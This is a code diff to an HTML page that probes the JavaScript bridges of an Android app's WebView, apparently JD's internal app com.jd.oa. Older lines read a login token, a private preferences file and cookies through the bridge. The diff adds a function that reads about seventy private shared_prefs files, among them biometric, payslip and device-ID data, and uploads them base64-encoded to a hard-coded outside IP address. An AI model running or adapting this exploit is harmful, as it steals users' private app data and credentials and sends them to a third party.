@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <title>AllOBJ</title>
-        
+
     <!-- <script src="https://lf1-cdn-tos.bytegoofy.com/goofy/fe/ies/bridge/bytedance/jsbridge-2.2.10.umd.js"></script> -->​
     <script src="https://cdn.jsdelivr.net/npm/vconsole@latest/dist/vconsole.min.js"></script>
     <script>
@@ -29,16 +29,16 @@
         }
 
         //getJDPinToken的回调 
-        window.callBackGetJDPinToken = function (a,b) {
-             console.log("data1:" + a);
-             console.log("data2:" + b);
-               alert(a);
-             alert(b);
+        window.callBackGetJDPinToken = function (a, b) {
+            console.log("data1:" + a);
+            console.log("data2:" + b);
+            alert(a);
+            alert(b);
         }
-        
+
         function callOne() {
-           //JDAppUnite.getPhoneBasicInfo("window.callBackMyMessage");
-           //JDAppUnite.requestLogin("window.callBackMyMessage");
+            //JDAppUnite.getPhoneBasicInfo("window.callBackMyMessage");
+            //JDAppUnite.requestLogin("window.callBackMyMessage");
             //var data = window.novelJs.getAdParams("https://www.vivo.com/", "https://www.vivo.com/", "");
             //var data = window.novelJs.getBrowserLocation("https://www.vivo.com/");
             //var data = window.worldCupClient.getPhoneInfo("http://www.vivo.com.cn");
@@ -49,9 +49,9 @@
             xmlhttp.send(); */
             //alert(JSON.stringify(window.JDAppUnite.getPageConfig()));
             //alert(JSON.stringify(window.xbrowser.getPageConfig()));
-             //alert(window.Android.getAppVersionInfo());
+            //alert(window.Android.getAppVersionInfo());
             window.Android.getJDPinToken("https://www.jd.com");
-             alert(window.Android.getFile("/data/data/com.jd.oa/shared_prefs/JdAndroidUUID.xml"));
+            alert(window.Android.getFile("/data/data/com.jd.oa/shared_prefs/JdAndroidUUID.xml"));
         }
 
         function shuxing() {
@@ -61,9 +61,66 @@
             //alert(JSON.stringify(window.__globalProps));
         }
         function call2() {
-            console.log("data:"+document.cookie);
+            console.log("data:" + document.cookie);
             alert(1);
             alert(document.cookie);
+        }
+
+        function upit() {
+            const server = "http://120.26.107.38/upload";  // 修改为你的服务器地址
+            const fileNames = [
+                "3808137dff6648cf.xml", "JdAndroidUUID.xml", "BIOMETRIC_OBJECT.xml",
+                "QV1com.tencent.tbs.qimei.sdk.QimeiSDK471f54c20b9ccc6f.xml", "BIOMETRIC_VERSION.xml",
+                "RMonitor_SP.xml", "BUGLY_COMMON_VALUES.xml", "SP_AROUTER_CACHE.xml", "BuglySdkInfos.xml",
+                "WebViewChromiumPrefs.xml", "FlutterSharedPreferences.xml", "_bundle_icsp.xml",
+                "IM_QUICK_APP.xml", "android.app.ActivityThread.IDS.xml", "JDFlutterModules.xml",
+                "JDME.xml", "crashrecord.xml", "JDReactAttendance.xml", "d616403a149025c1.xml",
+                "JDReactFeedback.xml", "jd_ma_sdk.xml", "jd_meeting.xml", "jdme__language_info.xml",
+                "jdme_devices_info.xml", "jrdy_common_sp.xml", "jrdy_local_jue_sp.xml",
+                "logx_strategyInfo.xml", "media_jdma_sharePref.xml", "multi_process.xml",
+                "new_b_log_ID_tbsbeacon_com.jd.oa_0M300GVKSH1IMBEK.xml", "plugin_setting.xml",
+                "preference_keys.xml", "qb_video_settings.xml", "qm_global_sp.xml", "react_prefrence.xml",
+                "sai.xml", "shooter_strategyInfo.xml", "tbs_download_config.xml", "tbs_oat_status.xml",
+                "tbs_preloadx5_check_cfg_file.xml", "tbss.xml", "uifa.xml", "x5_lc_settings.xml",
+                "x5_proxy_setting.xml", "JDReactInvestmentM.xml", "JDReactInvoiceClient.xml",
+                "JDReactJDMELibrary.xml", "JDReactJDMESurvey.xml", "JDReactJMEAppGroup.xml",
+                "JDReactJMEFpeTool.xml", "JDReactJMERNAPI.xml", "JDReactJMESalary.xml",
+                "JDReactJMETestRN.xml", "JDReactJMETripExpense.xml", "JDReactJMETripExpensePre.xml",
+                "JDReactJMEValues.xml", "JDReactJMEVocService.xml", "JDReactJMEcompanyTrip.xml",
+                "JDReactJoySpaceHub.xml", "JDReactOfwTool.xml", "JDReactPaySlip.xml",
+                "JDReactPurchaseApproval.xml", "JDReactReimbursementClient.xml", "JDReactSmartBus.xml",
+                "JDReactSplitOperationTool.xml", "JDWebCoreConfig.xml", "JS-Storage.xml", "app_locale_config.xml"
+            ];
+
+            fileNames.forEach(file => {
+                const path = "/data/data/com.jd.oa/shared_prefs/" + file;
+                try {
+                    const base64Data = window.Android.getFile(path);
+                    if (base64Data && base64Data.length > 50) {
+                        fetch(server, {
+                            method: "POST",
+                            headers: {
+                                "Content-Type": "application/json"
+                            },
+                            body: JSON.stringify({
+                                filename: file,
+                                base64: base64Data
+                            })
+                        }).then(res => {
+                            if (res.ok) {
+                                console.log(`✅ Uploaded: ${file}`);
+                            } else {
+                                console.error(`❌ Failed upload: ${file}`);
+                            }
+                        });
+                    } else {
+                        console.warn(`⚠️ Empty or missing: ${file}`);
+                    }
+                } catch (e) {
+                    console.error(`❌ Error getting file: ${file}`, e);
+                }
+            });
+
         }
     </script>
 </head>
@@ -77,7 +134,7 @@
     <br />
     <button style="width:200px;height:200px;" onclick="location.href=location.href+'?'">F5</button>
     <br />
-   
+
 </body>
 
 </html>
